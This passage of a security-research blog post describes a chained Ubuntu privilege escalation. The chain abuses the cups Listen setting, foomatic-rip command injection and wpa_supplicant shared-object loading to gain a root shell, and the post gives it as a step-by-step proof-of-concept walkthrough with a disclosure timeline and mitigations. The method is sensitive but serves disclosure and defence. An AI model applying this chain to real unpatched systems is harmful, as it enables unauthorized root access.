</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none">10</span>	  }</code></pre></div><p>This error tells us that root (or any user with a <code>UID</code> of 0) is explicitly disallowed. Since this step does not immediately result in root command execution, we must find another user to target, which can act as a stepping stone to our target of full root.</p><p>Before we evaluate our attack surface further, we will take a brief moment to discuss “external programs”.</p><h3>Cups external programs</h3><p>Cups is a complex beast — more complex than can be covered in an article of even this length. The following explainer is <em>heavily</em> condensed (and likely overly simplified), mainly to cover the areas we care about. I did not find this technique for this specific chain of vulnerabilities. However, like many things in this post, it was identified by reading documentation.</p><p>Cups is a printing system for Unix (literally. The name CUPS stands for Common Unix Printing System). You can register printers with cups, defining their capabilities using a PPD (Postscript Printer Description) configuration file. This file describes common things like the paper size, duplex options, resolution, etc. This file can also be used to define the supported filetypes of the printer. There is no use sending a raw PDF file to a printer that cannot understand the format. Therefore this file instructs cups what to do when a specific filetype is printed.</p><p>Cups distributes a set of “filters”, which can be used to convert between these different standard formats. For example, the <code>pdftops</code> filter can convert a <code>pdf</code> file to a <code>ps</code> (postscript) file, so you can effectively print PDF files on printers that do not understand them by transparently converting them inside cups.</p><p>One of the filters that a PPD file can specify is “foomatic-rip”, which claims to be a “universal filter”. As part of the configuration for this filter, there is a very juicy option: <code>FoomaticRIPCommandLine</code>. Even the naming of this option may pique your interest. This option can be used to define a command line that will be executed when the filter is triggered.</p><p>I will skip over the tedious validation using strace (<code>-fe execve</code> is a useful flag if you wish to try this at home) and conclude the following.</p><p>First we create a PPD file for a fake printer, which contains a <code>FoomaticRIPCommandLine</code> item, itself containing a command line controlled by us. We then register a new printer using this PPD file. Helpfully, our previously identified <code>org.opensuse.CupsPkHelper</code> DBus interface also includes a method for adding a printer with a manually specified PPD file. With our printer now created, we can attempt to print to it with a sample PDF file. Observing with strace we would see our command line configured in the PPD file executing when the print job is submitted.</p><p>The end result of this is command injection, and because of our previous exploitation controlling the User and Group parameters for <em>exactly these external programs</em>, the programs will run as any User/Group we desire (with the previously discussed exception of root).</p><p>Our final step is to identify a way of getting from any user/group to root.</p><h2>More vulnerability gadgets features</h2><p>There are probably a lot of ways of achieving this. For example, <code>/dev/sda2</code> (my root disk) has a group of <code>disk</code>, and permissions <code>660</code>, so I could use the configuration to set my Group to disk and modify this file. However, when I am in this kind of situation, I always try to err on the side of simplicity. A lot of things can go wrong with modifying a raw disk (even with good tools like <code>debugfs</code>), and it can make exploitation fiddly and unreliable (I’ve done it <a href="https://issuetracker.google.com/issues/172219872" rel="noopener noreferrer" target="_blank"><u>before</u></a>). Therefore, I took the time to attempt to identify other options which may be more reliable or at least simpler. When reporting vulnerabilities to vendors, simplicity is always beneficial.</p><p>Much like the start of this post, I began by investigating what was available on the DBus bus. This time, however, I first looked at the permission settings in the DBus daemon (defined in <code>/usr/share/dbus-1/system.d</code>) to find services accessible by specific users or groups and not to my original user.</p><p>These configuration files look something like the following <code>/usr/share/dbus-1/system.d/wpa_supplicant.conf</code>:</p><div class="marg-b-small"><pre style="display:block;overflow-x:auto;padding:1.5rem;background:#011627;color:#d6deeb;border-radius:0.75rem;line-height:1.4"><code class="language-javascript" style="white-space:pre"><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">1</span><span> &lt;!DOCTYPE busconfig PUBLIC
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">2</span><span> </span><span style="color:#ecc48d">&quot;-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN&quot;</span><span>
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">3</span><span> </span><span style="color:#ecc48d">&quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd&quot;</span><span>&gt;
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">4</span><span></span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">busconfig</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">5</span><span class="xml">        </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">policy</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">user</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;root&quot;</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">6</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">own</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">7</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">send_destination</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">8</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">send_interface</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">9</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">receive_sender</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">receive_type</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;signal&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">10</span><span class="xml">        </span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">policy</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">11</span><span class="xml">        </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">policy</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">group</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;netdev&quot;</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">12</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">send_destination</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">13</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">send_interface</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">14</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">allow</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">receive_sender</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">receive_type</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;signal&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">15</span><span class="xml">        </span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">policy</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">16</span><span class="xml">        </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">policy</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">context</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;default&quot;</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">17</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">deny</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">own</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">18</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">deny</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">send_destination</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">19</span><span class="xml">                </span><span class="xml" style="color:#7fdbca">&lt;</span><span class="xml" style="color:#7fdbca">deny</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">receive_sender</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;fi.w1.wpa_supplicant1&quot;</span><span class="xml" style="color:#7fdbca"> </span><span class="xml" style="color:#7fdbca">receive_type</span><span class="xml" style="color:#7fdbca">=</span><span class="xml" style="color:#ecc48d">&quot;signal&quot;</span><span class="xml" style="color:#7fdbca">/&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">20</span><span class="xml">        </span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">policy</span><span class="xml" style="color:#7fdbca">&gt;</span><span class="xml">
</span><span class="comment linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:1.25em;padding-right:1em;text-align:right;user-select:none">21</span><span class="xml"></span><span class="xml" style="color:#7fdbca">&lt;/</span><span class="xml" style="color:#7fdbca">busconfig</span><span class="xml" style="color:#7fdbca">&gt;</span></code></pre></div><p>In this example, for <code>wpa_supplicant</code>, normal users (i.e. <code>context=”default”</code>) cannot <code>send_destination</code> (call) methods on the interface at all. User root (<code>user=”root”</code>) can own and call the methods, this is pretty standard but doesn’t help us because we can’t become root. However, the potentially interesting part here is group netdev being allowed to call methods on this interface as well. It turns out the ability for the netdev group to call the interface is actually a Debian-family-specific <a href="https://git.launchpad.net/ubuntu/+source/wpa/tree/debian/patches/02_dbus_group_policy.patch" rel="noopener noreferrer" target="_blank"><u>addition</u></a>.</p><p>Here we can iterate over finding an interesting interface callable by a user or group we can achieve, enumerate the accessible functions, and read the documentation. I will skip that this time for brevity (and because I did not discover this feature during this research) and we can go straight on to what the gadget is.</p><p>The <code>wpa_supplicant</code> service runs as root and, as we saw in the above example, has an interface that could be callable with our previous exploitation by becoming group <code>netdev</code>. On this interface there is a method <code>CreateInterface</code>. This method is generally used to configure a network interface for wireless network security (e.g. WPA/802.1X). This method takes an argument <code>ConfigFile</code>, which is a path to a <code>wpa_supplicant.conf</code> configuration file. Looking at the <a href="https://w1.fi/cgit/hostap/tree/wpa_supplicant/wpa_supplicant.conf#n177" rel="noopener noreferrer" target="_blank"><u>documentation example</u></a> for this file shows a couple of options that can be used to load arbitrary shared objects which can provide various functionality to the supplicant (e.g. crypto routines).</p><p>We can, therefore, write a shared object with some payload inside it, create a configuration file which includes a reference to this shared object to be loaded, exploit our previous vulnerability chain to attain command execution with a group ID of netdev, call the <code>wpa_supplicant</code>’s <code>CreateInterface</code> DBus method with our configuration file, and achieve arbitrary code execution when <code>wpa_supplicant</code> loads the shared object. Because, as previously mentioned, <code>wpa_supplicant</code> runs as root, <strong>we will now have arbitrary root code execution</strong>.</p><p>In the actual proof of concept, we use the shared object to set the Python binary to be setuid root. This makes it very easy to finish our script with an interactive root shell, and perform the cleanup activities necessary to undo what we have changed, such as the cups file permissions.</p><h2>Proof of concept wrap-up</h2><p>The following section combines everything we’ve learned into a walkthrough of what the proof of concept actually looks like, to achieve full root command execution.</p><ol><li><p>Create a staging area in <code>/tmp/stage</code> for the symbolic links which we will target with cups.</p></li><li><p>Call the <code>ServerSetSettings</code> DBus method to change the cups <code>Listen</code> parameter to <code>/tmp/stage/cupsd.conf</code>, which is a symlink to <code>/etc/cups/cupsd.conf</code>.</p></li><li><p>The file <code>/etc/cups/cupsd.conf</code> will now be world-writable. Fix up the changes made by <code>ServerSetSettings</code> and add an additional <code>Listen</code> configuration item pointing to <code>/tmp/stage/cups-files.conf</code>, which is a symlink to <code>/etc/cups/cups-files.conf</code>.</p></li><li><p>Use <code>ServerSetSettings</code> to change the <code>IdleExitTimeout</code> parameter. We don’t care about this parameter, but we are using it to trigger the cups restart, which is a privileged action.</p></li><li><p>The file <code>/etc/cups/cups-files.conf</code> will now be world writable. Modify this file to set the <code>Group</code> parameter to <code>netdev</code>. We don’t actually need to set the <code>User</code> parameter for our chain.</p></li><li><p>Repeat step 4 to trigger a restart of cups, causing the <code>Group</code> parameter in <code>cups-files.conf</code> to take effect.</p></li><li><p>Stage for <code>wpa_supplicant</code> by creating a configuration file that defines the <code>opensc_engine_path</code> pointing to our shared object and creating a Python script to call the <code>wpa_supplicant</code>’s <code>CreateInterface</code> method. Because of the required data types of this method, it is easier to use Python than <code>dbus-send</code>.</p></li><li><p>Install a new printer into cups using the <code>PrinterAddWithPpdFile</code>’s DBus method. The PPD file passed here will define the <code>FoomaticRIPCommandLine</code> parameter to execute the Python script created in step 7.</p></li><li><p>Print a sample PDF file using the newly created printer. This will trigger the Python script, which will call the <code>CreateInterface</code> method, which will cause <code>wpa_supplicant</code> to load our shared object defined in our configuration file. This shared object will set Python to be setuid root as soon as it is loaded (using the gcc <code>constructor</code> attribute).</p></li><li><p>Using the now-changed setuid Python, clean up the changes we have made. Remove any new lines from the various cups configuration files, reset the permissions of these files to their originals, and restart cups so everything takes effect.</p></li><li><p>Finally, provide an interactive root shell to the user to finish the proof of concept.</p></li></ol><p>Or, as a diagram:</p><div class="max-w-full w-full marg-h-auto"><figure data-component="Media Asset Container"><img alt="blog-ubuntu-chart" loading="lazy" width="1037" height="1426" decoding="async" data-nimg="1" class="radius-large overflow-hidden" style="color:transparent" srcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1725899741%2Fblog-ubuntu-chart.png&amp;w=1240&amp;q=75 1x, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1725899741%2Fblog-ubuntu-chart.png&amp;w=2560&amp;q=75 2x" src="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1725899741%2Fblog-ubuntu-chart.png&amp;w=2560&amp;q=75"/></figure></div><h2>Conclusion</h2><p>In this post, we have seen that it only takes the leveraging of one small vulnerability, combined with a number of features, to achieve a chain of exploitation resulting in a full privilege escalation. Even where security controls are in place preventing the direct exploitation of a small vulnerability it may still be possible to finesse limited exploitation potential into a much greater impact.</p><p>There are a few key takeaways that I find very useful to bear in mind when performing this kind of research. The first is trying to be as holistic as possible. When looking at a system as complex as an entire Linux distribution, it pays to consider the system as a whole rather than focusing on one component. If I had limited my scope to cups alone, even with the multiple items I identified, I may not have been successful in escalating all the way to root. Still valuable research, to be sure, but not as good as it turned out to be. By keeping my eyes open and not showing favoritism to a single area, it’s possible to pivot to a completely separate area of the system (from printing to networking) to get the results I’d hoped.</p><p>The second key takeaway is that it is not necessary to find everything in order. Especially when it comes to features, it’s very valuable to have notes or prior knowledge of “if I’m in situation X, I could use feature Y to achieve result Z”. Some of the features used in this chain have been around for years, ready to be dropped into your PoC as the next step. Even when looking at something new to you, don’t make assumptions about what is achievable or realistic. You never know when you’ll end up in a weird jail as a low-privilege user, but if you see something in that context, keep it in mind when you’re gluing things together. Do not be afraid to temporarily decrease your privileges if it might help you get higher privileges on the way out. We (arguably) did this here by dropping privileges from rory:sudo to lp:netdev, because we knew lp:netdev could end up higher than rory:sudo could on its own.</p><p>We want to end with a shout-out to both the Ubuntu Security team and the cups team, who responded quickly to the reports. A special shout out to the cups team who were able to produce a patch on the same day as the report which both fixes the direct vulnerability but also added additional security measures, which would have made it doubly difficult to exploit in the first place.</p><h2>Timeline</h2><p>08-May-2024: Reported the vulnerability chain to Ubuntu Security</p><p>23-May-2024: wpa_supplicant issue assigned <a href="https://security.snyk.io/vuln/SNYK-UNMANAGED-WPASUPPLICANT-7644387" rel="noopener noreferrer" target="_blank">CVE-2024-5290</a> by Ubuntu security</p><p>24-May-2024: <a href="https://github.com/OpenPrinting/cups/security/advisories/GHSA-vvwp-mv6j-hw6f" rel="noopener noreferrer" target="_blank"><u>Reported</u></a> the cups specific vulnerability to OpenPrinting/cups at Ubuntu’s request. GHSA-vvwp-mv6j-hw6f</p><p>24-May-2024: cups proposed a suitable patch for the reported vulnerability</p><p>24-May-2024: cups issue assigned <a href="https://security.snyk.io/vuln/SNYK-UNMANAGED-OPENPRINTINGCUPS-7254925" rel="noopener noreferrer" target="_blank">CVE-2024-35235</a> by Github</p><p>30-May-2024: wpa_supplicant <a href="https://bugs.launchpad.net/ubuntu/+source/wpa/+bug/2067613" rel="noopener noreferrer" target="_blank"><u>bug</u></a> opened by Ubuntu Security</p><p>03-June-2024: cups announced upcoming advisory release to </p><p>11-June-2024: cups released patch and advisory</p><p>26-July-2024: wpa_supplicant bug patch created</p><p>06-Aug-2024: wpa_supplicant patch released</p><h2>Mitigations</h2><p>Cups mitigated the identified vulnerability by removing the call to chmod entirely and relying on umask to ensure the permissions are correct. Additionally, when cupsd is configured to be started on-demand (i.e. via systemd socket activation), cupsd will not process the Listen directives itself.</p><p>The wpa_supplicant project mitigated this issue by implementing a mandatory path prefix to ensure that all loaded shared objects are under the /usr/lib directory. This ensures that attacker-controlled code cannot be loaded even with sufficient access to the DBus interface.</p></div></article><div class="max-w-8 marg-h-auto marg-t-huge d-flex flex-wrap gap-extra-small items-center"><span class="txt-body-bold">Posted in<!-- -->:</span><div class="tags"><a class="tag" data-component="Tag" href="/blog/?topic=container-security"><span>Container Security</span></a><a class="tag" data-component="Tag" href="/blog/?topic=open-source-security"><span>Open Source Security</span></a><a class="tag" data-component="Tag" href="/blog/?topic=security-labs"><span>Security Labs</span></a></div></div></div><div class="cols-3 mobile:cols-12 marg-l-auto"><div class="h-viewport-8 mobile:h-full -marg-t-large pad-t-large p-sticky top-huge no-scrollbar"><div class="d-flex flex-col gap-extra-large"><div class="w-full marg-h-auto p-relative aspect-ratio-banner d-block mobile:d-none" data-component="Banner"><img alt="feature-snyk-platform-learn-getting-snyk-setup" fetchpriority="high" decoding="async" data-nimg="fill" class="object-fit-cover radius-medium" style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;color:transparent" sizes="(min-width: 961px) 25vw, 0vw" srcSet="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=16&amp;q=75 16w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=32&amp;q=75 32w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=48&amp;q=75 48w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=64&amp;q=75 64w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=96&amp;q=75 96w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=128&amp;q=75 128w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=256&amp;q=75 256w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=384&amp;q=75 384w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=580&amp;q=75 580w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=960&amp;q=75 960w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=1240&amp;q=75 1240w, /_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=2560&amp;q=75 2560w" src="/_next/image/?url=https%3A%2F%2Fres.cloudinary.com%2Fsnyk%2Fimage%2Fupload%2Fv1686163009%2Ffeature-snyk-platform-learn-getting-snyk-setup.png&amp;w=2560&amp;q=75"/></div><div class="card-wrapper" data-component="Card"><article class="card spotlight"><div class="card-body"><h3 class="txt-subhead txt-ui-headline" data-component="Title">Snyk Top 10: Vulnerabilites you should know</h3><div class="txt-body txt-ui-body txt-rich" data-component="Text"><p>Find out which types of vulnerabilities are most likely to appear in your projects based on Snyk scan results and security research.</p></div><div class="buttons marg-t-auto pad-t-small"><a class="button primary link-stretched" title="See the report" data-component="Next Link" href="/snyk-top-10/">See the report</a></div></div></article></div></div></div></div></div></div></section></main><footer class="brandui-footer"><div class="footer-content content-block"><nav class="footer-navigation"><div class="footer-column"><h2 class="footer-column-title txt-mini-header-small">Products &amp; Solutions</h2><ul class="footer-links"><li><a class="d-block" href="/product/">What is Snyk?</a></li><li><a class="d-block" href="/platform/">Developer Security Platform</a></li><li><a class="d-block" href="/plans/">Pricing</a></li></ul></div><div class="footer-column"><h2 class="footer-column-title txt-mini-header-small">Our Resources</h2><ul class="footer-links"><li><a class="d-block" href="/resource-library/">Resource library</a></li><li><a class="d-block" href="/blog/">Blog</a></li><li><a class="d-block" href="/podcasts/the-secure-developer/">Snyk’s podcasts</a></li></ul></div><div class="footer-column"><h2 class="footer-column-title txt-mini-header-small">Our Ecosystem</h2><ul class="footer-links"><li><a class="d-block" href="/platform/learn/">Snyk Learn</a></li><li><a href="https://docs.snyk.io/" rel="noopener noreferrer" target="_blank" class="d-block">Snyk User Docs</a></li><li><a href="https://support.snyk.io/hc/en-us" rel="noopener noreferrer" target="_blank" class="d-block">Snyk Support</a></li><li><a href="https://security.snyk.io/" rel="noopener noreferrer" target="_blank" class="d-block">Snyk Vuln Database</a></li><li><a href="https://updates.snyk.io/" rel="noopener noreferrer" target="_blank" class="d-block">Snyk Updates</a></li><li><a href="https://trust.snyk.io/home" rel="noopener noreferrer" target="_blank" class="d-block">Snyk Trust Center</a></li></ul></div><div class="footer-column"><h2 class="footer-column-title txt-mini-header-small">Company &amp; Community</h2><ul class="footer-links"><li><a class="d-block" href="/about/">About Snyk</a></li><li><a class="d-block" href="/contact-us/">Contact us</a></li><li><a class="d-block" href="/schedule-a-demo/">Book a demo</a></li><li><a class="d-block" href="/careers/">Careers</a></li><li><a class="d-block" href="/events/">Events &amp; webinars</a></li><li><a class="d-block" href="/snyk-ambassadors/">Ambassadors</a></li></ul></div><div class="footer-column"><h2 class="footer-column-title txt-mini-header-small">Why Snyk</h2><ul class="footer-links"><li><a class="d-block" href="/comparison/github-and-snyk/">Snyk With GitHub</a></li><li><a class="d-block" href="/comparison/snyk-vs-veracode/">Snyk vs Veracode</a></li><li><a class="d-block" href="/comparison/snyk-vs-checkmarx/">Snyk vs Checkmarx</a></li><li><a class="d-block" href="/comparison/snyk-vs-synopsys/">Snyk vs Synopsys</a></li></ul></div></nav><div class="footer-info"><div class="footer-column"><div class="d-grid gap-medium"><div class="max-w-1 w-full snyk-logo logo-default-solid" alt="Snyk Logo"></div><ul class="footer-social-links" aria-label="Social Media Links"><li><a href="https://twitter.com/snyksec" target="_blank" rel="noopener" aria-label="twitter"><i title="twitter" class="general-icon icon-twitter icon-small icon-border"></i></a></li><li><a href="https://www.youtube.com/channel/UCh4dJzctb0NhSibjU-e2P6w" target="_blank" rel="noopener" aria-label="youtube"><i title="youtube" class="general-icon icon-youtube icon-small icon-border"></i></a></li><li><a href="https://www.linkedin.com/company/snyk" target="_blank" rel="noopener" aria-label="linkedin"><i title="linkedin" class="general-icon icon-linkedin icon-small icon-border"></i></a></li><li><a href="https://github.com/snyk/" target="_blank" rel="noopener" aria-label="github"><i title="github" class="general-icon icon-github icon-small icon-border"></i></a></li><li><a href="https://www.npmjs.com/package/snyk" target="_blank" rel="noopener" aria-label="npm"><i title="npm" class="general-icon icon-npm icon-small icon-border"></i></a></li><li><a href="https://snyk.co/discordcommunity" target="_blank" rel="noopener" aria-label="discord"><i title="discord" class="general-icon icon-discord icon-small icon-border"></i></a></li></ul></div></div><div class="footer-column"><div class="d-grid gap-extra-small"><h2 class="txt-headline-small txt-theme-solid">The developer security platform</h2><p>Snyk gives you the visibility, context, and control you need to work alongside developers on reducing application risk.</p></div></div><div class="footer-column d-flex justify-center items-center"><a class="button primary marg-b-medium" title="More about us" data-component="Next Link" href="/about/">More about us</a></div></div><div class="footer-legal"><div class="footer-legal-copyright"><p>© 2025 Snyk Limited<br/>Registered in England and Wales</p></div><ul class="footer-legal-links" aria-label="Legal Links"><li><a href="/policies/terms-of-service/">Legal terms</a></li><li><a href="/policies/privacy/">Privacy Notice</a></li><li><a href="/policies/website-terms-of-use/">Terms of use</a></li><li><a href="https://preferences.snyk.io/dont_sell">California residents: do not sell my information</a></li></ul></div></div></footer><div id="modal-root"></div></div><!--$--><!--/$--></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"page":{"metadata":{"tags":[{"sys":{"type":"Link","linkType":"Tag","id":"displayOnSecurityLabsPage"}}],"concepts":[]},"sys":{"space":{"sys":{"type":"Link","linkType":"Space","id":"oyrbri43adzz"}},"id":"503xeqJhZE3OioVTsPd1Se","type":"Entry","createdAt":"2024-09-09T17:53:57.198Z","updatedAt":"2024-11-20T14:20:24.309Z","environment":{"sys":{"id":"master","type":"Link","linkType":"Environment"}},"publishedVersion":239,"revision":5,"contentType":{"sys":{"type":"Link","linkType":"ContentType","id":"templateBlogPost"}},"locale":"en-US"},"fields":{"title":"Abusing 